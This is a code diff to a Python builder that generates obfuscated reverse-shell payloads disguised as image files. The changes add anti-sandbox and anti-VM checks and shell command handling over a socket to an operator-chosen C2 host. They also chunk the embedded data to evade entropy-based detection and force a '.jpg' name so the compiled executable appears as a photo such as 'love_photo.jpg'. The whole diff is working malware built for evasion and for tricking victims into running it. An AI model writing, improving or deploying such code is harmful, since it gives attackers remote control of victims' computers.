@@ -92,24 +92,45 @@ def create_junk_code():
 
 def create_anti_sandbox():
     """Anti-sandbox and anti-VM checks"""
-    return '''
+    
+    vmware_obf = obfuscate_string('vmware')
+    vbox_obf = obfuscate_string('virtualbox')
+    qemu_obf = obfuscate_string('qemu')
+    xen_obf = obfuscate_string('xen')
+    
+    return f'''
 import time
 import os
 import platform
+import ctypes
 
 def _check_environment():
     """Anti-sandbox checks"""
     # Check if running in VM
-    _vm_indicators = ['vmware', 'virtualbox', 'qemu', 'xen']
+    _vm_indicators = [{vmware_obf}, {vbox_obf}, {qemu_obf}, {xen_obf}]
     _sys_info = platform.platform().lower()
     for _indicator in _vm_indicators:
         if _indicator in _sys_info:
             return False
     
-    # Check RAM (VMs usually have less)
+    # Check RAM using ctypes (no psutil dependency)
     try:
-        import psutil
-        if psutil.virtual_memory().total < 4 * 1024 * 1024 * 1024:  # Less than 4GB
+        class MEMORYSTATUSEX(ctypes.Structure):
+            _fields_ = [
+                ("dwLength", ctypes.c_uint32),
+                ("dwMemoryLoad", ctypes.c_uint32),
+                ("ullTotalPhys", ctypes.c_uint64),
+                ("ullAvailPhys", ctypes.c_uint64),
+                ("ullTotalPageFile", ctypes.c_uint64),
+                ("ullAvailPageFile", ctypes.c_uint64),
+                ("ullTotalVirtual", ctypes.c_uint64),
+                ("ullAvailVirtual", ctypes.c_uint64),
+                ("sullAvailExtendedVirtual", ctypes.c_uint64),
+            ]
+        stat = MEMORYSTATUSEX()
+        stat.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
+        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat))
+        if stat.ullTotalPhys < 4 * 1024 * 1024 * 1024:  # Less than 4GB
             return False
     except:
         pass
@@ -136,12 +157,14 @@ def create_obfuscated_payload(c2_host, c2_port):
     var_thread = generate_random_var()
     var_time = generate_random_var()
     var_func = generate_random_var()
+    var_os = generate_random_var()
     
     # Obfuscate imports
     import_socket = f"{var_socket} = __import__({obfuscate_string('socket')})"
     import_subprocess = f"{var_subprocess} = __import__({obfuscate_string('subprocess')})"
     import_thread = f"from threading import Thread as {var_thread}"
     import_time = f"{var_time} = __import__({obfuscate_string('time')})"
+    import_os = f"{var_os} = __import__({obfuscate_string('os')})"
     
     # Obfuscate strings
     host_obf = obfuscate_string(c2_host)
@@ -158,6 +181,7 @@ def create_obfuscated_payload(c2_host, c2_port):
 {import_subprocess}
 {import_thread}
 {import_time}
+{import_os}
 
 # More junk
 {create_junk_code()}
@@ -184,6 +208,14 @@ def {var_func}():
             
             if _cmd.lower() in [{obfuscate_string('exit')}, {obfuscate_string('quit')}]:
                 break
+                
+            if _cmd.startswith("cd "):
+                try:
+                    {var_os}.chdir(_cmd[3:])
+                    _s.send(b"Directory changed.\\n")
+                except Exception as _e:
+                    _s.send(f"Error: {{_e}}\\n".encode())
+                continue
             
             try:
                 _out = {var_subprocess}.check_output(_cmd, shell=True, stderr={var_subprocess}.STDOUT)
@@ -246,6 +278,10 @@ def create_wrapper(image_path, payload_code):
     
     with open(image_path, 'rb') as f:
         image_b64 = base64.b64encode(f.read()).decode()
+        
+    # Chunk base64 to avoid high entropy string signatures
+    b64_chunks = [image_b64[i:i+80] for i in range(0, len(image_b64), 80)]
+    chunk_str = ',\\n        '.join(f'"{c}"' for c in b64_chunks)
     
     # Random variable names
     var_b64 = generate_random_var()
@@ -268,8 +304,11 @@ from threading import Thread as {var_thread}
 # More junk
 {create_junk_code()}
 
-# Embedded image (obfuscated)
-_img_data = """{image_b64}"""
+# Embedded image (chunked to bypass entropy checks)
+_img_chunks = [
+        {chunk_str}
+]
+_img_data = "".join(_img_chunks)
 
 def _show_img():
     """Display image"""
@@ -371,6 +410,12 @@ def main():
     c2_host = input(f"{Colors.CYAN}C2 Host (IP/domain): {Colors.RESET}").strip() or "127.0.0.1"
     c2_port = input(f"{Colors.CYAN}C2 Port [4444]: {Colors.RESET}").strip() or "4444"
     output_name = input(f"{Colors.CYAN}Output filename [love_photo]: {Colors.RESET}").strip() or "love_photo"
+    
+    # Force the .jpg extension on the output name to exploit Windows extension hiding
+    # If the user provides 'photo', it becomes 'photo.jpg'
+    # The compiler will output 'photo.jpg.exe', which Windows displays as 'photo.jpg'
+    if not output_name.lower().endswith('.jpg'):
+        output_name = f"{output_name}.jpg"
     
     use_nuitka = input(f"{Colors.CYAN}Use Nuitka compiler? (Better evasion) (Y/n): {Colors.RESET}").strip().lower()
     use_nuitka = use_nuitka != 'n'
